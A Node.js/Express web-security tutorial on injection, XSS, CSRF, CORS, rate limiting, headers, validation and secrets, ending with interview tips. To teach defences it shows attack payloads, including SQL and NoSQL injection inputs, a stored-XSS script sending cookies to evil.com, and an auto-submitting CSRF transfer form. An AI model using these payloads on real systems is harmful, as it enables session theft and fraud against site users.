# 📗 12 — Security Best Practices

---

## Common Web Vulnerabilities (OWASP Top 10)

| # | Vulnerability | Description |
|---|---------------|-------------|
| 1 | **Injection (SQL/NoSQL)** | Malicious code in user input |
| 2 | **Broken Authentication** | Weak passwords, no rate limiting |
| 3 | **XSS (Cross-Site Scripting)** | Injecting malicious scripts |
| 4 | **CSRF (Cross-Site Request Forgery)** | Tricking authenticated users |
| 5 | **Broken Access Control** | Users accessing unauthorized resources |
| 6 | **Security Misconfiguration** | Default credentials, verbose errors |
| 7 | **Sensitive Data Exposure** | Unencrypted passwords, API keys in code |

---

## 1. SQL / NoSQL Injection

### SQL Injection
```javascript
// ❌ VULNERABLE — string concatenation
const query = `SELECT * FROM users WHERE email = '${req.body.email}'`;
// Attacker input: ' OR 1=1 --
// Becomes: SELECT * FROM users WHERE email = '' OR 1=1 --'  ← Returns ALL users!

// ✅ SAFE — parameterized queries
const { rows } = await pool.query(
  'SELECT * FROM users WHERE email = $1',
  [req.body.email]
);
```

### NoSQL Injection
```javascript
// ❌ VULNERABLE
const user = await User.findOne({
  email: req.body.email,
  password: req.body.password,
});
// Attacker sends: { "email": {"$gt": ""}, "password": {"$gt": ""} }
// This matches ANY document!

// ✅ SAFE — validate input types
const { email, password } = req.body;
if (typeof email !== 'string' || typeof password !== 'string') {
  return res.status(400).json({ error: 'Invalid input' });
}
```

**Prevention:**
- Always use parameterized queries
- Validate and sanitize all inputs
- Use `express-mongo-sanitize` for MongoDB

```bash
npm install express-mongo-sanitize
```
```javascript
const mongoSanitize = require('express-mongo-sanitize');
app.use(mongoSanitize()); // Removes $ and . from req.body/params/query
```

---

## 2. XSS (Cross-Site Scripting)

Attacker injects malicious JavaScript into your website.

```html
<!-- Stored XSS: Attacker stores script in database -->
<!-- Comment field: <script>document.location='http://evil.com/steal?cookie='+document.cookie</script> -->
<!-- When other users view the comment, the script runs and steals their cookies -->
```

**Prevention:**

```bash
npm install helmet xss-clean
```

```javascript
const helmet = require('helmet');
const xssClean = require('xss-clean');

app.use(helmet());      // Sets various HTTP security headers
app.use(xssClean());    // Sanitize user input (clean <script> tags etc.)

// Always escape output in templates
// EJS: Use <%= variable %> (escaped) NOT <%- variable %> (unescaped)

// Set Content-Security-Policy header
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'"],
    styleSrc: ["'self'", "'unsafe-inline'"],
    imgSrc: ["'self'", "data:"],
  },
}));
```

---

## 3. CSRF (Cross-Site Request Forgery)

Attacker tricks a logged-in user into making unwanted requests.

```html
<!-- Evil website with hidden form -->
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker" />
  <input type="hidden" name="amount" value="10000" />
</form>
<script>document.forms[0].submit();</script>
<!-- If user is logged into bank.com, the browser sends the cookie automatically! -->
```

**Prevention:**

```javascript
// 1. SameSite cookies (best defense)
res.cookie('token', jwt, {
  sameSite: 'strict', // Cookie not sent with cross-site requests
  httpOnly: true,
  secure: true,
});

// 2. CSRF Token (for forms/SSR apps)
const csrf = require('csurf');
app.use(csrf({ cookie: true }));

app.get('/form', (req, res) => {
  res.render('form', { csrfToken: req.csrfToken() });
});
// <input type="hidden" name="_csrf" value="<%= csrfToken %>">
```

---

## 4. CORS (Cross-Origin Resource Sharing)

CORS controls which domains can make requests to your API.

```bash
npm install cors
```

```javascript
const cors = require('cors');

// Allow all origins (development only!)
app.use(cors());

// Restrict to specific origins (production)
app.use(cors({
  origin: ['https://myapp.com', 'https://www.myapp.com'],
  methods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  credentials: true,   // Allow cookies to be sent
  maxAge: 86400,        // Cache preflight for 24 hours
}));

// Dynamic origin
app.use(cors({
  origin: (origin, callback) => {
    const whitelist = ['https://myapp.com', 'https://admin.myapp.com'];
    if (!origin || whitelist.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
}));
```

---

## 5. Rate Limiting

Prevent brute force attacks and DoS.

```bash
npm install express-rate-limit
```

```javascript
const rateLimit = require('express-rate-limit');

// General rate limit
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100,                  // Max 100 requests per window
  message: { error: 'Too many requests, please try again later' },
  standardHeaders: true,     // Send rate limit info in headers
});
app.use('/api', limiter);

// Strict rate limit for auth routes
const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5,                    // Max 5 login attempts per 15 min
  message: { error: 'Too many login attempts' },
});
app.use('/api/auth/login', authLimiter);
```

---

## 6. Helmet — Security Headers

```javascript
const helmet = require('helmet');
app.use(helmet());
```

Helmet sets these headers:
```
X-Content-Type-Options: nosniff       ← Prevent MIME sniffing
X-Frame-Options: DENY                  ← Prevent clickjacking
X-XSS-Protection: 0                   ← Rely on CSP instead
Strict-Transport-Security: max-age=... ← Force HTTPS
Content-Security-Policy: ...           ← Control resource loading
Referrer-Policy: no-referrer           ← Control referrer info
```

---

## 7. Input Validation

```bash
npm install express-validator
# or
npm install joi
```

### Using Joi

```javascript
const Joi = require('joi');

const registerSchema = Joi.object({
  name: Joi.string().min(2).max(50).required(),
  email: Joi.string().email().required(),
  password: Joi.string().min(8).pattern(/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)/).required()
    .messages({
      'string.pattern.base': 'Password must contain uppercase, lowercase, and number',
    }),
  age: Joi.number().integer().min(13).max(120),
  role: Joi.string().valid('user', 'admin').default('user'),
});

// Validation middleware
const validate = (schema) => (req, res, next) => {
  const { error, value } = schema.validate(req.body, { abortEarly: false });
  if (error) {
    const errors = error.details.map(d => d.message);
    return res.status(400).json({ success: false, errors });
  }
  req.body = value; // Use validated/sanitized values
  next();
};

app.post('/api/register', validate(registerSchema), registerController);
```

---

## 8. Data Sanitization

```bash
npm install express-mongo-sanitize xss-clean hpp
```

```javascript
const mongoSanitize = require('express-mongo-sanitize');
const xssClean = require('xss-clean');
const hpp = require('hpp');

app.use(mongoSanitize());   // Prevent NoSQL injection
app.use(xssClean());        // Prevent XSS
app.use(hpp());              // Prevent HTTP parameter pollution
// ?sort=name&sort=email → hpp keeps only the last: sort=email
```

---

## 9. Environment Variables & Secrets

```javascript
// ❌ NEVER do this
const JWT_SECRET = 'my-super-secret-key';

// ✅ Use environment variables
require('dotenv').config();
const JWT_SECRET = process.env.JWT_SECRET;
```

```env
# .env (NEVER commit this!)
NODE_ENV=development
PORT=3000
MONGO_URI=mongodb://localhost:27017/myapp
JWT_SECRET=a-very-long-random-string-use-crypto
REFRESH_SECRET=another-long-random-string
```

```gitignore
# .gitignore
.env
node_modules/
```

---

## Complete Security Setup

```javascript
const express = require('express');
const helmet = require('helmet');
const cors = require('cors');
const rateLimit = require('express-rate-limit');
const mongoSanitize = require('express-mongo-sanitize');
const xssClean = require('xss-clean');
const hpp = require('hpp');
const cookieParser = require('cookie-parser');

const app = express();

// 1. Security Headers
app.use(helmet());

// 2. CORS
app.use(cors({
  origin: process.env.CLIENT_URL,
  credentials: true,
}));

// 3. Rate Limiting
app.use('/api', rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100,
}));

// 4. Body Parsing (with size limit)
app.use(express.json({ limit: '10kb' }));  // Prevent large payload attacks
app.use(express.urlencoded({ extended: true, limit: '10kb' }));
app.use(cookieParser());

// 5. Data Sanitization
app.use(mongoSanitize());
app.use(xssClean());
app.use(hpp());

// 6. Routes
// ... your routes

// 7. Error handler
app.use(errorHandler);
```

---

## 🎯 Interview Tips

> **Q: What is XSS and how to prevent it?**
> XSS allows attackers to inject malicious scripts into web pages. Prevent with: input sanitization, output encoding, CSP headers, httpOnly cookies, and `helmet`.

> **Q: What is CORS and why is it needed?**
> CORS is a security mechanism that restricts which domains can make requests to your API. Browsers block cross-origin requests by default. You configure the server to explicitly allow specific origins.

> **Q: How to prevent brute force attacks?**
> Rate limiting (express-rate-limit), account lockout after N failed attempts, CAPTCHAs, progressive delays, and monitoring.

---
